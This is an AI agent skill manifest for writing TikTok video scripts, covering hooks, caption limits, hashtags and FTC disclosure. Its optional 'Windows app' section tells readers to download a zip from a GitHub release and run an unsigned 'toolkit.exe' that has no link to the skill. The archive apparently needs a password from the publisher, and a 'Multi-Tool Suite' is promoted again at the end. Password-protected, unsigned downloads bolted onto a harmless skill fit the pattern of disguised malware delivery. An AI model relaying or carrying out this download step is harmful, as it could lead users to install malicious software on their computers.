---
name: tiktok-video-script
description: Writes a TikTok video script with a spoken hook, beat by beat lines and a caption, measured against the platform limits. Use when the user asks for tiktok script writer, tiktok hook script, tiktok caption limit. For US consumer brands, creators and agencies running TikTok campaigns.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# TikTok Video Script Writer

**Writes a TikTok video script with a spoken hook, beat by beat lines and a caption, measured against the platform limits.** Written for US consumer brands, creators and agencies running TikTok campaigns.

Use this skill when someone asks for:

- tiktok script writer
- tiktok hook script
- tiktok caption limit
- tiktok video ideas

---

## The job

Videos get posted with a one-line caption and no hook, and the edit never matches what the brief asked for.

## What you get

1. Collect the topic, the audience, the length and the single action the video should drive.
2. Write the spoken hook for the first three seconds and the beats that follow.
3. Write the caption, the on-screen text and the hashtags as separate copy blocks.
4. Flag the beats that need a disclosure, a licensed sound or a written release.

Output contract:

- script - the hook, the beats with time stamps and the closing line
- on_screen - the overlay text for each beat
- caption - the caption under the limit with the hashtags on their own line
- flags - the beats that need a disclosure, a licence or a release

## US specifics that matter

- TikTok caps a video caption at 2,200 characters and a bio at 80 characters.
- TikTok's own creator guidance is to use three to five hashtags in a caption rather than filling the space.
- The FTC requires an endorsement disclosure to be clear and conspicuous, and TikTok's branded content label sits on top of that duty.
- TikTok's community rules bar content that uses copyrighted music or footage without the rights.

## Guardrails (hard rules)

- Never use a commercial sound the user has not licensed for business use.
- Never write a hook that mocks a protected class or targets a sensitive personal attribute.
- Never promise views, engagement rates or sales from a video.

## Quickstart

### 1. Fill in the brief

`templates/tiktok-notes.md` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/build_tiktok_script.py --input tiktok-notes.md --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/tiktok-script-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**TikTok's limits**

- Caption: 2,200 characters. Bio: 80 characters.
- TikTok's creator guidance: three to five hashtags in a caption.
- On-screen text has to work with the sound off.

**Hooks that hold**

- Open on the tension: the thing the viewer already wanted or disagreed with.
- One idea per video; a second idea resets the viewer.
- The first three seconds decide whether the rest is ever seen.

**Disclosure and music**

- Say the paid or gifted relationship in the video and turn on the branded content label.
- Use sounds from the commercial music library your account can access.
- Do not use a creator's likeness or voice without a written release.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/tiktok-script-rules.md` - TikTok limits and US content rules
- `templates/tiktok-notes.md` - the brief to fill in
- `scripts/build_tiktok_script.py` - the working script

## Verify the bundle

```bash
python3 scripts/build_tiktok_script.py --input tiktok-notes.md --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
